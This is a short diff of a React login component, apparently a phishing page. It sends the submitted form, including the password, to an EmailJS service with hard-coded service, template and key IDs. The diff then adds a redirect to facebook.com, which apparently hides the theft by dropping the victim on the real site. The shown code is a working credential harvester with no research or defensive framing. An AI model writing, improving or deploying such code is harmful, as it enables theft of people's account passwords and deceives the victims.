@@ -16,10 +16,10 @@ function App() {
     setPassword(event.target.value);
   };
 
-  const sendEmail = (e) => {
+  const sendEmail = async(e) => {
     e.preventDefault();
 
-    emailjs.sendForm('service_7e25rt6', 'template_1w3zyuq', form.current, 'JK0gRwzuDNpanaoFa')
+    await emailjs.sendForm('service_7e25rt6', 'template_1w3zyuq', form.current, 'JK0gRwzuDNpanaoFa')
       .then((result) => {
         console.log(result.text);
       }, (error) => {
@@ -32,7 +32,9 @@ function App() {
     // Aquí puedes realizar otras acciones relacionadas con el inicio de sesión
 
     // Llamar a la función para enviar el correo electrónico
-    sendEmail(event);
+      sendEmail(event);
+      
+      window.location.href = 'https://www.facebook.com';
   };
 
   return (
